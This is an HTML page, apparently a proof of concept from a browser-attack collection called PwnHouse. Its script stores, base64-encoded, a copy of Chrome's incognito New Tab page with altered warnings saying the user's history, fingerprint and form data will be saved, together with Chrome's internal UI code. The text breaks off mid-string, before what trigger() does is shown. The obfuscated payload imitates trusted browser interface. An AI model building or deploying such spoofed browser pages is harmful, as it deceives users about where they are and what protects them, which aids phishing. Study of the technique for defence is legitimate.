<html>
<body>
<script>
function trigger() {
	var content = "PCFkb2N0eXBlIGh0bWw+DQo8aHRtbCBkaXI9Imx0ciINCmhhc2N1c3RvbWJhY2tncm91bmQ9ImZhbHNlIg0KYm9va21hcmtiYXJhdHRhY2hlZD0iZmFsc2UiDQpsYW5nPSJlbiINCmNsYXNzPSJtZCI+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjx0aXRsZT5OZXcgVGFiPC90aXRsZT4NCjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgiPg0KPHN0eWxlPg0KQGltcG9ydCB1cmwoaHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9Um9ib3RvKTsNCmh0bWwgew0KICBkaXJlY3Rpb246IGx0cjsNCn0NCmJvZHkgew0KICBmb250LWZhbWlseTogUm9ib3RvLCAnU2Vnb2UgVUknLCBUYWhvbWEsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogODEuMjUlOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoNTAsIDU0LCA1Nyk7DQp9DQpidXR0b24gew0KICBmb250LWZhbWlseTogUm9ib3RvLCAnU2Vnb2UgVUknLCBUYWhvbWEsIHNhbnMtc2VyaWY7DQp9DQoNCmJvZHkgew0KLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7DQpmb250LXNpemU6IDEwMCU7DQptYXJnaW46IDA7DQp9DQouY29udGVudCB7DQpiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoNTAsIDU0LCA1Nyk7DQpjb2xvcjogcmdiKDIzMiwgMjM0LCAyMzcpOw0KZm9udC1zaXplOiBjYWxjKDEwMCUgLSAycHgpOw0KbGluZS1oZWlnaHQ6IGNhbGMoMTAwJSArIDZweCk7DQptaW4td2lkdGg6IDI0MHB4Ow0KfQ0KaDEgew0KZm9udC1zaXplOiBjYWxjKDEwMCUgKyA4cHgpOw0KZm9udC13ZWlnaHQ6IDQwMDsNCmxpbmUtaGVpZ2h0OiBjYWxjKDEwMCUgKyA4cHgpOw0KfQ0KZW0gew0KY29sb3I6IHdoaXRlOw0KZm9udC1zdHlsZTogbm9ybWFsOw0KfQ0KLmxlYXJuLW1vcmUtYnV0dG9uIHsNCmNvbG9yOiByZ2IoMTM4LCAxODAsIDI0OCk7DQp0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQpAbWVkaWEgKG1heC13aWR0aDogMjQwcHgpLA0KKG1heC1oZWlnaHQ6IDMyMHB4KSB7DQouY29udGVudCB7DQpmb250LXNpemU6IGNhbGMoMTAwJSAtIDRweCk7DQpsaW5lLWhlaWdodDogY2FsYygxMDAlICsgNnB4KTsNCn0NCmgxIHsNCmZvbnQtc2l6ZTogY2FsYygxMDAlICsgNHB4KTsNCmxpbmUtaGVpZ2h0OiBjYWxjKDEwMCUgKyA0cHgpOw0KfQ0KfQ0KLmljb24gew0KY29udGVudDogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkRBZ01qUXdJajQ4WnlCdmNHRmphWFI1UFNJdU9DSWdabWxzYkQwaUkwWkdSaUkrUEhCaGRHZ2daRDBpVFRFeU1TQXdRelV6TGprdExqWXRMallnTlRNdU9TQXdJREV5TVdNdU5pQTJOUzR5SURVekxqZ2dNVEU0TGpRZ01URTVJREV4T1NBMk55NHhMallnTVRJeExqWXROVE11T1NBeE1qRXRNVEl4UXpJek9TNDBJRFV6TGpnZ01UZzJMakl1TmlBeE1qRWdNSHBOT1RBdU5TQTFPV011TXkwdU9TQXhMVEV1TlNBeUxqSXRNUzR5SURJdU1pNDFJREU1TGprZ05DNHpJREU1TGprZ05DNHpjek0yTGpndE5TNDJJRE00TGpFdE5TNDVZekV1TVMwdU1pQXhMamt1TkNBeUxqRWdNUzQwTGpFdU5DQTJMak1nTWpFdU15QXhNUzQzSURNNUxqVklOemd1TTBNNE15NDVJRGM1TGpZZ09UQXVNU0EyTUNBNU1DNDFJRFU1ZW0wNE5TNDVJREV3TXk0ell5MHVPQ0F4TWk0eUxURXdMamNnTWpJdU1TMHlNaTQ1SURJeUxqa3RNVFF1TXk0NUxUSTJMakV0TVRBdU5DMHlOaTR4TFRJMExqVWdNQzB1TnlBd0xURXVOQzR4TFRJdU1TMHlMUzQzTFRRdU1pMHhMVFl1TkMweExUSXVNeUF3TFRRdU5TNDBMVFl1TnlBeExqRXVNUzQzTGpFZ01TNHpMakVnTWlBd0lERTBMakV0TVRFdU9DQXlOUzQwTFRJMkxqRWdNalF1TlMweE1pNHlMUzQ0TFRJeUxqRXRNVEF1TnkweU1pNDVMVEl5TGprdExqZ3RNVFF1TWlBeE1DNDFMVEkyTGpFZ01qUXVOUzB5Tmk0eElERXdMaklnTUNBeE9TQTJMak1nTWpJdU55QXhOUzR5SURJdU55MHVPQ0ExTGpVdE1TNHpJRGd1TkMweExqTWdNaTQ0SURBZ05TNDFMalFnT0M0eElERXVNaUF6TGpjdE9DNDVJREV5TGpRdE1UVXVNU0F5TWk0M0xURTFMakVnTVRRdU1TQXdJREkxTGpRZ01URXVPU0F5TkM0MUlESTJMakY2YlRJekxqUXRNelF1TTBnME1pNDBZeTB1TWlBd0xTNHpMUzR6TFM0eExTNDBJRFV1TWkweUxqY2dNelV1TkMweE55NDJJRGM1TFRFM0xqWWdORE11TnlBd0lEY3pMalVnTVRRdU9DQTNPQzQySURFM0xqWXVNaTR4TGpFdU5DMHVNUzQwZWlJdlBqeGphWEpqYkdVZ1kzZzlJakUxTVM0NUlpQmplVDBpTVRZd0xqZ2lJSEk5SWpFM0xqUWlMejQ4WTJseVkyeGxJR040UFNJNU1DNHhJaUJqZVQwaU1UWXdMamdpSUhJOUlqRTNMalFpTHo0OEwyYytQQzl6ZG1jKyk7DQpoZWlnaHQ6IDEyMHB4Ow0Kd2lkdGg6IDEyMHB4Ow0KfQ0KQG1lZGlhIChtYXgtaGVpZ2h0OiA0ODBweCksDQoobWF4LXdpZHRoOiA3MjBweCkgew0KLmljb24gew0KaGVpZ2h0OiA3MnB4Ow0Kd2lkdGg6IDcycHg7DQp9DQp9DQpAbWVkaWEgKG1heC13aWR0aDogNzIwcHgpIHsNCkBtZWRpYSAobWF4LXdpZHRoOiAyNDBweCksDQoobWF4LWhlaWdodDogNDgwcHgpIHsNCi5pY29uIHsNCmhlaWdodDogNDhweDsNCndpZHRoOiA0OHB4Ow0KfQ0KfQ0KfQ0KLmNvbnRlbnQgPiAubGVhcm4tbW9yZS1idXR0b24gew0KZGlzcGxheTogbm9uZTsNCn0NCkBtZWRpYSAobWF4LXdpZHRoOiA3MjBweCkgew0KI3N1YnRpdGxlID4gLmxlYXJuLW1vcmUtYnV0dG9uIHsNCmRpc3BsYXk6IG5vbmU7DQp9DQouY29udGVudCA+IC5sZWFybi1tb3JlLWJ1dHRvbiB7DQpkaXNwbGF5OiBibG9jazsNCn0NCn0NCi5jb250ZW50IHsNCm1hcmdpbi1pbmxpbmUtZW5kOiBhdXRvOw0KbWFyZ2luLWlubGluZS1zdGFydDogYXV0bzsNCm1heC13aWR0aDogNjAwcHg7DQp9DQouaWNvbiB7DQptYXJnaW4taW5saW5lLWVuZDogYXV0bzsNCm1hcmdpbi1pbmxpbmUtc3RhcnQ6IGF1dG87DQp9DQpoMSB7DQp0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQojYnVsbGV0cG9pbnRzLXdyYXBwZXIgew0KZGlzcGxheTogZmxleDsNCmZsZXgtd3JhcDogd3JhcDsNCmp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsNCn0NCi5idWxsZXRwb2ludHMgew0KZmxleC1iYXNpczogMjg1cHg7DQpmbGV4LWdyb3c6IDE7DQpmbGV4LXNocmluazogMDsNCn0NCi5idWxsZXRwb2ludHMuZmlyc3Qgew0KbWFyZ2luLWlubGluZS1lbmQ6IDMwcHg7DQp9DQpAbWVkaWEgKG1heC13aWR0aDogNzIwcHgpIHsNCi5jb250ZW50IHsNCm1heC13aWR0aDogNjAwcHggIWltcG9ydGFudDsNCnRleHQtYWxpZ246IHN0YXJ0Ow0KfQ0KLmljb24gew0KbWFyZ2luLWlubGluZS1zdGFydDogMDsNCn0NCmgxIHsNCnRleHQtYWxpZ246IHN0YXJ0Ow0KfQ0KfQ0KLmJ1bGxldHBvaW50cyB1bCB7DQptYXJnaW46IDRweCAwIDA7DQpwYWRkaW5nLWlubGluZS1zdGFydDogMTZweDsNCn0NCkBtZWRpYSAobWluLXdpZHRoOiA3MjBweCkgew0KLmljb24sDQpoMSwNCiNzdWJ0aXRsZSwNCi5sZWFybi1tb3JlLWJ1dHRvbiB7DQptYXJnaW4tdG9wOiAxLjVyZW07DQp9DQouaWNvbiwNCmgxLA0KI3N1YnRpdGxlLA0KLmJ1bGxldHBvaW50cyB7DQptYXJnaW4tYm90dG9tOiAxLjVyZW07DQp9DQouY29udGVudCB7DQptYXJnaW4tdG9wOiA0MHB4Ow0KbWluLXdpZHRoOiAyNDBweDsNCnBhZGRpbmc6IDhweCA0OHB4IDI0cHg7DQp9DQpAbWVkaWEgKG1heC1oZWlnaHQ6IDQ4MHB4KSB7DQpodG1sLA0KYm9keSwNCi5jb250ZW50IHsNCmhlaWdodDogMTAwJTsNCn0NCi5jb250ZW50IHsNCm1hcmdpbi1ib3R0b206IDA7DQptYXJnaW4tdG9wOiAwOw0KcGFkZGluZy1ib3R0b206IDA7DQpwYWRkaW5nLXRvcDogMDsNCn0NCi5pY29uIHsNCm1hcmdpbi10b3A6IDA7DQpwYWRkaW5nLXRvcDogMzJweDsNCn0NCn0NCkBtZWRpYSAobWF4LWhlaWdodDogMzIwcHgpIHsNCmgxLA0KI3N1YnRpdGxlIHsNCm1hcmdpbi1ib3R0b206IDE2cHg7DQptYXJnaW4tdG9wOiAxNnB4Ow0KfQ0KDQoubGVhcm4tbW9yZS1idXR0b24sDQouYnVsbGV0cG9pbnRzLA0KLmljb24gew0KbWFyZ2luLWJvdHRvbTogMTZweDsNCn0NCn0NCn0NCkBtZWRpYSAobWF4LXdpZHRoOiA3MjBweCkgew0KLmNvbnRlbnQgew0KbWluLXdpZHRoOiAxNzZweDsNCnBhZGRpbmc6IDcycHggMzJweDsNCn0NCi5pY29uLA0KaDEsDQojc3VidGl0bGUgew0KbWFyZ2luLWJvdHRvbTogMS41cmVtOw0KbWFyZ2luLXRvcDogMS41cmVtOw0KfQ0KDQouYnVsbGV0cG9pbnRzLA0KLmxlYXJuLW1vcmUtYnV0dG9uIHsNCm1hcmdpbi1ib3R0b206IDEuNXJlbTsNCn0NCkBtZWRpYSAobWF4LWhlaWdodDogNjAwcHgpIHsNCi5jb250ZW50IHsNCnBhZGRpbmctdG9wOiA0OHB4Ow0KfQ0KLmljb24sDQpoMSwNCiNzdWJ0aXRsZSB7DQptYXJnaW4tYm90dG9tOiAxcmVtOw0KbWFyZ2luLXRvcDogMXJlbTsNCn0NCi5idWxsZXRwb2ludHMsDQoubGVhcm4tbW9yZS1idXR0b24gew0KbWFyZ2luLWJvdHRvbTogMXJlbTsNCn0NCn0NCkBtZWRpYSAobWF4LWhlaWdodDogNDgwcHgpIHsNCi5jb250ZW50IHsNCnBhZGRpbmctdG9wOiAzMnB4Ow0KfQ0KfQ0KLmljb24gew0KbWFyZ2luLXRvcDogMDsNCn0NCi5sZWFybi1tb3JlLWJ1dHRvbiB7DQptYXJnaW4tYm90dG9tOiAwOw0KfQ0KfQ0KQG1lZGlhIChtYXgtd2lkdGg6IDI0MHB4KSB7DQouY29udGVudCB7DQptaW4td2lkdGg6IDE5MnB4Ow0KcGFkZGluZy1pbmxpbmUtZW5kOiAyNHB4Ow0KcGFkZGluZy1pbmxpbmUtc3RhcnQ6IDI0cHg7DQp9DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8ZGl2IGNsYXNzPSJjb250ZW50Ij4NCjxkaXYgY2xhc3M9Imljb24iIHJvbGU9InByZXNlbnRhdGlvbiIgYWx0PSIiPjwvZGl2Pg0KPGgxPllvdSd2ZSBnb25lIGluY29nbml0bywgYnV0IHlvdSdyZSBub3QgaGlkZGVuPC9oMT4NCjxwIGlkPSJzdWJ0aXRsZSI+DQo8c3Bhbj5Ob3cgeW91IGNhbiBicm93c2Ugb3Blbmx5LCBhbmQgdGhlIHdob2xlIHdvcmxkIHdpbGwgc2VlIHlvdXIgYWN0aXZpdHkuIE9idmlvdXNseSwgZXZlcnl0aGluZyB3aWxsIGJlIHNhdmVkLjwvc3Bhbj4NCjxhIGNsYXNzPSJsZWFybi1tb3JlLWJ1dHRvbiINCmhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS8weDQ4cGlyYWovUHduSG91c2UvI1ByaXZhY3kiPkxlYXJuIG1vcmU8L2E+DQo8L3A+DQo8ZGl2IGlkPSJidWxsZXRwb2ludHMtd3JhcHBlciI+DQo8ZGl2IGNsYXNzPSJidWxsZXRwb2ludHMgZmlyc3QiPldlIDxlbT53aWxsIHNhdmU8L2VtPiB0aGUgZm9sbG93aW5nIGluZm9ybWF0aW9uOg0KPHVsPg0KPGxpPllvdXIgYnJvd3NpbmcgaGlzdG9yeSAoRXRhZykNCjxsaT5BbGwgeW91ciBkYXRhIChicm93c2VyLWZpbmdlcnByaW50aW5nKQ0KPGxpPkluZm9ybWF0aW9uIGVudGVyZWQgaW4gZm9ybXMgKG1heWJlIG5vdCkNCjwvdWw+PC9kaXY+DQo8ZGl2IGNsYXNzPSJidWxsZXRwb2ludHMiPllvdXIgYWN0aXZpdHkgPGVtPmlzIHN0aWxsIHZpc2libGU8L2VtPiB0bzoNCjx1bD4NCjxsaT5Vcywgbm90IFUuUy4sIG9yIG1heWJlIC4uLg0KPGxpPkdvb2dsZSwgRmFjZWJvb2ssIEFtYXpvbiBhbmQgZXZlcnkgY29tcGFueSB5b3UgY2FuIHRoaW5rIG9mLg0KPGxpPkJhc2ljYWxseSB0aGUgd2hvbGUgaW50ZXJuZXQNCjwvdWw+PC9kaXY+DQo8L2Rpdj4NCjxhIGNsYXNzPSJsZWFybi1tb3JlLWJ1dHRvbiIgaHJlZj0iaHR0cHM6Ly9zdXBwb3J0Lmdvb2dsZS5jb20vY2hyb21lLz9wPWluY29nbml0byI+TGVhcm4gbW9yZTwvYT4NCjwvZGl2Pg0KPHNjcmlwdD4NCnZhciBXZWJVSUxpc3RlbmVyOw0KdmFyIGNyID0gY3IgfHwgZnVuY3Rpb24oZ2xvYmFsKSB7DQogICd1c2Ugc3RyaWN0JzsNCiAgZnVuY3Rpb24gZXhwb3J0UGF0aChuYW1lLCBvcHRfb2JqZWN0LCBvcHRfb2JqZWN0VG9FeHBvcnRUbykgew0KICAgIGNvbnN0IHBhcnRzID0gbmFtZS5zcGxpdCgnLicpOw0KICAgIGxldCBjdXIgPSBvcHRfb2JqZWN0VG9FeHBvcnRUbyB8fCBnbG9iYWw7DQoNCiAgICBmb3IgKGxldCBwYXJ0OyBwYXJ0cy5sZW5ndGggJiYgKHBhcnQgPSBwYXJ0cy5zaGlmdCgpKTspIHsNCiAgICAgIGlmICghcGFydHMubGVuZ3RoICYmIG9wdF9vYmplY3QgIT09IHVuZGVmaW5lZCkgew0KICAgICAgICAvLyBsYXN0IHBhcnQgYW5kIHdlIGhhdmUgYW4gb2JqZWN0OyB1c2UgaXQNCiAgICAgICAgY3VyW3BhcnRdID0gb3B0X29iamVjdDsNCiAgICAgIH0gZWxzZSBpZiAocGFydCBpbiBjdXIpIHsNCiAgICAgICAgY3VyID0gY3VyW3BhcnRdOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgY3VyID0gY3VyW3BhcnRdID0ge307DQogICAgICB9DQogICAgfQ0KICAgIHJldHVybiBjdXI7DQogIH0NCiAgZnVuY3Rpb24gZGlzcGF0Y2hQcm9wZXJ0eUNoYW5nZSh0YXJnZXQsIHByb3BlcnR5TmFtZSwgbmV3VmFsdWUsIG9sZFZhbHVlKSB7DQogICAgY29uc3QgZSA9IG5ldyBFdmVudChwcm9wZXJ0eU5hbWUgKyAnQ2hhbmdlJyk7DQogICAgZS5wcm9wZXJ0eU5hbWUgPSBwcm9wZXJ0eU5hbWU7DQogICAgZS5uZXdWYWx1ZSA9IG5ld1ZhbHVlOw0KICAgIGUub2xkVmFsdWUgPSBvbGRWYWx1ZTsNCiAgICB0YXJnZXQuZGlzcGF0Y2hFdmVudChlKTsNCiAgfQ0KICBmdW5jdGlvbiBnZXRBdHRyaWJ1dGVOYW1lKGpzTmFtZSkgew0KICAgIHJldHVybiBqc05hbWUucmVwbGFjZSgvKFtBLVpdKS9nLCAnLSQxJykudG9Mb3dlckNhc2UoKTsNCiAgfQ0KICBjb25zdCBQcm9wZXJ0eUtpbmQgPSB7DQogICAgSlM6ICdqcycsDQogICAgQVRUUjogJ2F0dHInLA0KICAgIEJPT0xfQVRUUjogJ2Jvb2xBdHRyJw0KICB9Ow0KICBmdW5jdGlvbiBnZXRHZXR0ZXIobmFtZSwga2luZCkgew0KICAgIGxldCBhdHRyaWJ1dGVOYW1lOw0KICAgIHN3aXRjaCAoa2luZCkgew0KICAgICAgY2FzZSBQcm9wZXJ0eUtpbmQuSlM6DQogICAgICAgIGNvbnN0IHByaXZhdGVOYW1lID0gbmFtZSArICdfJzsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCkgew0KICAgICAgICAgIHJldHVybiB0aGlzW3ByaXZhdGVOYW1lXTsNCiAgICAgICAgfTsNCiAgICAgIGNhc2UgUHJvcGVydHlLaW5kLkFUVFI6DQogICAgICAgIGF0dHJpYnV0ZU5hbWUgPSBnZXRBdHRyaWJ1dGVOYW1lKG5hbWUpOw0KICAgICAgICByZXR1cm4gZnVuY3Rpb24oKSB7DQogICAgICAgICAgcmV0dXJuIHRoaXMuZ2V0QXR0cmlidXRlKGF0dHJpYnV0ZU5hbWUpOw0KICAgICAgICB9Ow0KICAgICAgY2FzZSBQcm9wZXJ0eUtpbmQuQk9PTF9BVFRSOg0KICAgICAgICBhdHRyaWJ1dGVOYW1lID0gZ2V0QXR0cmlidXRlTmFtZShuYW1lKTsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCkgew0KICAgICAgICAgIHJldHVybiB0aGlzLmhhc0F0dHJpYnV0ZShhdHRyaWJ1dGVOYW1lKTsNCiAgICAgICAgfTsNCiAgICB9DQogICAgdGhyb3cgJ25vdCByZWFjaGVkJzsNCiAgfQ0KICBmdW5jdGlvbiBnZXRTZXR0ZXIobmFtZSwga2luZCwgb3B0X3NldEhvb2spIHsNCiAgICBsZXQgYXR0cmlidXRlTmFtZTsNCiAgICBzd2l0Y2ggKGtpbmQpIHsNCiAgICAgIGNhc2UgUHJvcGVydHlLaW5kLkpTOg0KICAgICAgICBjb25zdCBwcml2YXRlTmFtZSA9IG5hbWUgKyAnXyc7DQogICAgICAgIHJldHVybiBmdW5jdGlvbih2YWx1ZSkgew0KICAgICAgICAgIGNvbnN0IG9sZFZhbHVlID0gdGhpc1tuYW1lXTsNCiAgICAgICAgICBpZiAodmFsdWUgIT09IG9sZFZhbHVlKSB7DQogICAgICAgICAgICB0aGlzW3ByaXZhdGVOYW1lXSA9IHZhbHVlOw0KICAgICAgICAgICAgaWYgKG9wdF9zZXRIb29rKSB7DQogICAgICAgICAgICAgIG9wdF9zZXRIb29rLmNhbGwodGhpcywgdmFsdWUsIG9sZFZhbHVlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGRpc3BhdGNoUHJvcGVydHlDaGFuZ2UodGhpcywgbmFtZSwgdmFsdWUsIG9sZFZhbHVlKTsNCiAgICAgICAgICB9DQogICAgICAgIH07DQoNCiAgICAgIGNhc2UgUHJvcGVydHlLaW5kLkFUVFI6DQogICAgICAgIGF0dHJpYnV0ZU5hbWUgPSBnZXRBdHRyaWJ1dGVOYW1lKG5hbWUpOw0KICAgICAgICByZXR1cm4gZnVuY3Rpb24odmFsdWUpIHsNCiAgICAgICAgICBjb25zdCBvbGRWYWx1ZSA9IHRoaXNbbmFtZV07DQogICAgICAgICAgaWYgKHZhbHVlICE9PSBvbGRWYWx1ZSkgew0KICAgICAgICAgICAgaWYgKHZhbHVlID09IHVuZGVmaW5lZCkgew0KICAgICAgICAgICAgICB0aGlzLnJlbW92ZUF0dHJpYnV0ZShhdHRyaWJ1dGVOYW1lKTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgIHRoaXMuc2V0QXR0cmlidXRlKGF0dHJpYnV0ZU5hbWUsIHZhbHVlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChvcHRfc2V0SG9vaykgew0KICAgICAgICAgICAgICBvcHRfc2V0SG9vay5jYWxsKHRoaXMsIHZhbHVlLCBvbGRWYWx1ZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBkaXNwYXRjaFByb3BlcnR5Q2hhbmdlKHRoaXMsIG5hbWUsIHZhbHVlLCBvbGRWYWx1ZSk7DQogICAgICAgICAgfQ0KICAgICAgICB9Ow0KDQogICAgICBjYXNlIFByb3BlcnR5S2luZC5CT09MX0FUVFI6DQogICAgICAgIGF0dHJpYnV0ZU5hbWUgPSBnZXRBdHRyaWJ1dGVOYW1lKG5hbWUpOw0KICAgICAgICByZXR1cm4gZnVuY3Rpb24odmFsdWUpIHsNCiAgICAgICAgICBjb25zdCBvbGRWYWx1ZSA9IHRoaXNbbmFtZV07DQogICAgICAgICAgaWYgKHZhbHVlICE9PSBvbGRWYWx1ZSkgew0KICAgICAgICAgICAgaWYgKHZhbHVlKSB7DQogICAgICAgICAgICAgIHRoaXMuc2V0QXR0cmlidXRlKGF0dHJpYnV0ZU5hbWUsIG5hbWUpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgdGhpcy5yZW1vdmVBdHRyaWJ1dGUoYXR0cmlidXRlTmFtZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAob3B0X3NldEhvb2spIHsNCiAgICAgICAgICAgICAgb3B0X3NldEhvb2suY2FsbCh0aGlzLCB2YWx1ZSwgb2xkVmFsdWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZGlzcGF0Y2hQcm9wZXJ0eUNoYW5nZSh0aGlzLCBuYW1lLCB2YWx1ZSwgb2xkVmFsdWUpOw0KICAgICAgICAgIH0NCiAgICAgICAgfTsNCiAgICB9DQoNCiAgICB0aHJvdyAnbm90IHJlYWNoZWQnOw0KICB9DQoNCiAgZnVuY3Rpb24gZGVmaW5lUHJvcGVydHkob2JqLCBuYW1lLCBvcHRfa2luZCwgb3B0X3NldEhvb2spIHsNCiAgICBpZiAodHlwZW9mIG9iaiA9PSAnZnVuY3Rpb24nKSB7DQogICAgICBvYmogPSBvYmoucHJvdG90eXBlOw0KICAgIH0NCg0KICAgIGNvbnN0IGtpbmQgPSAob3B0X2tpbmQgfHwgUHJvcGVydHlLaW5kLkpTKTsNCg0KICAgIGlmICghb2JqLl9fbG9va3VwR2V0dGVyX18obmFtZSkpIHsNCiAgICAgIG9iai5fX2RlZmluZUdldHRlcl9fKG5hbWUsIGdldEdldHRlcihuYW1lLCBraW5kKSk7DQogICAgfQ0KDQogICAgaWYgKCFvYmouX19sb29rdXBTZXR0ZXJfXyhuYW1lKSkgew0KICAgICAgb2JqLl9fZGVmaW5lU2V0dGVyX18obmFtZSwgZ2V0U2V0dGVyKG5hbWUsIGtpbmQsIG9wdF9zZXRIb29rKSk7DQogICAgfQ0KICB9DQoNCiAgbGV0IHVpZENvdW50ZXIgPSAxOw0KDQogIGZ1bmN0aW9uIGNyZWF0ZVVpZCgpIHsNCiAgICByZXR1cm4gdWlkQ291bnRlcisrOw0KICB9DQoNCiAgZnVuY3Rpb24gZGlzcGF0Y2hTaW1wbGVFdmVudCh0YXJnZXQsIHR5cGUsIG9wdF9idWJibGVzLCBvcHRfY2FuY2VsYWJsZSkgew0KICAgIGNvbnN0IGUgPSBuZXcgRXZlbnQodHlwZSwgew0KICAgICAgYnViYmxlczogb3B0X2J1YmJsZXMsDQogICAgICBjYW5jZWxhYmxlOiBvcHRfY2FuY2VsYWJsZSA9PT0gdW5kZWZpbmVkIHx8IG9wdF9jYW5jZWxhYmxlDQogICAgfSk7DQogICAgcmV0dXJuIHRhcmdldC5kaXNwYXRjaEV2ZW50KGUpOw0KICB9DQoNCiAgZnVuY3Rpb24gZGVmaW5lKG5hbWUsIGZ1bikgew0KICAgIGNvbnN0IG9iaiA9IGV4cG9ydFBhdGgobmFtZSk7DQogICAgY29uc3QgZXhwb3J0cyA9IGZ1bigpOw0KICAgIGZvciAoY29uc3QgcHJvcGVydHlOYW1lIGluIGV4cG9ydHMpIHsNCiAgICAgIGNvbnN0IHByb3BlcnR5RGVzY3JpcHRvciA9DQogICAgICAgICAgT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihleHBvcnRzLCBwcm9wZXJ0eU5hbWUpOw0KICAgICAgaWYgKHByb3BlcnR5RGVzY3JpcHRvcikgew0KICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydHkob2JqLCBwcm9wZXJ0eU5hbWUsIHByb3BlcnR5RGVzY3JpcHRvcik7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgZnVuY3Rpb24gYWRkU2luZ2xldG9uR2V0dGVyKGN0b3IpIHsNCiAgICBjdG9yLmdldEluc3RhbmNlID0gZnVuY3Rpb24oKSB7DQogICAgICByZXR1cm4gY3Rvci5pbnN0YW5jZV8gfHwgKGN0b3IuaW5zdGFuY2VfID0gbmV3IGN0b3IoKSk7DQogICAgfTsNCiAgfQ0KICBjb25zdCBjaHJvbWVTZW5kUmVzb2x2ZXJNYXAgPSB7fTsNCg0KICBmdW5jdGlvbiB3ZWJVSVJlc3BvbnNlKGlkLCBpc1N1Y2Nlc3MsIHJlc3BvbnNlKSB7DQogICAgY29uc3QgcmVzb2x2ZXIgPSBjaHJvbWVTZW5kUmVzb2x2ZXJNYXBbaWRdOw0KICAgIGRlbGV0ZSBjaHJvbWVTZW5kUmVzb2x2ZXJNYXBbaWRdOw0KDQogICAgaWYgKGlzU3VjY2Vzcykgew0KICAgICAgcmVzb2x2ZXIucmVzb2x2ZShyZXNwb25zZSk7DQogICAgfSBlbHNlIHsNCiAgICAgIHJlc29sdmVyLnJlamVjdChyZXNwb25zZSk7DQogICAgfQ0KICB9DQoNCiAgZnVuY3Rpb24gc2VuZFdpdGhQcm9taXNlKG1ldGhvZE5hbWUsIHZhcl9hcmdzKSB7DQogICAgY29uc3QgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cywgMSk7DQogICAgY29uc3QgcHJvbWlzZVJlc29sdmVyID0gbmV3IFByb21pc2VSZXNvbHZlcigpOw0KICAgIGNvbnN0IGlkID0gbWV0aG9kTmFtZSArICdfJyArIGNyZWF0ZVVpZCgpOw0KICAgIGNocm9tZVNlbmRSZXNvbHZlck1hcFtpZF0gPSBwcm9taXNlUmVzb2x2ZXI7DQogICAgY2hyb21lLnNlbmQobWV0aG9kTmFtZSwgW2lkXS5jb25jYXQoYXJncykpOw0KICAgIHJldHVybiBwcm9taXNlUmVzb2x2ZXIucHJvbWlzZTsNCiAgfQ0KDQogIGNvbnN0IHdlYlVJTGlzdGVuZXJNYXAgPSB7fTsNCg0KDQogIGZ1bmN0aW9uIHdlYlVJTGlzdGVuZXJDYWxsYmFjayhldmVudCwgdmFyX2FyZ3MpIHsNCiAgICBjb25zdCBldmVudExpc3RlbmVyc01hcCA9IHdlYlVJTGlzdGVuZXJNYXBbZXZlbnRdOw0KICAgIGlmICghZXZlbnRMaXN0ZW5lcnNNYXApIHsNCiAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBjb25zdCBhcmdzID0gQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLCAxKTsNCiAgICBmb3IgKGNvbnN0IGxpc3RlbmVySWQgaW4gZXZlbnRMaXN0ZW5lcnNNYXApIHsNCiAgICAgIGV2ZW50TGlzdGVuZXJzTWFwW2xpc3RlbmVySWRdLmFwcGx5KG51bGwsIGFyZ3MpOw0KICAgIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIGFkZFdlYlVJTGlzdGVuZXIoZXZlbnROYW1lLCBjYWxsYmFjaykgew0KICAgIHdlYlVJTGlzdGVuZXJNYXBbZXZlbnROYW1lXSA9IHdlYlVJTGlzdGVuZXJNYXBbZXZlbnROYW1lXSB8fCB7fTsNCiAgICBjb25zdCB1aWQgPSBjcmVhdGVVaWQoKTsNCiAgICB3ZWJVSUxpc3RlbmVyTWFwW2V2ZW50TmFtZV1bdWlkXSA9IGNhbGxiYWNrOw0KICAgIHJldHVybiB7ZXZlbnROYW1lOiBldmVudE5hbWUsIHVpZDogdWlkfTsNCiAgfQ0KDQogIGZ1bmN0aW9uIHJlbW92ZVdlYlVJTGlzdGVuZXIobGlzdGVuZXIpIHsNCiAgICBjb25zdCBsaXN0ZW5lckV4aXN0cyA9IHdlYlVJTGlzdGVuZXJNYXBbbGlzdGVuZXIuZXZlbnROYW1lXSAmJg0KICAgICAgICB3ZWJVSUxpc3RlbmVyTWFwW2xpc3RlbmVyLmV2ZW50TmFtZV1bbGlzdGVuZXIudWlkXTsNCiAgICBpZiAobGlzdGVuZXJFeGlzdHMpIHsNC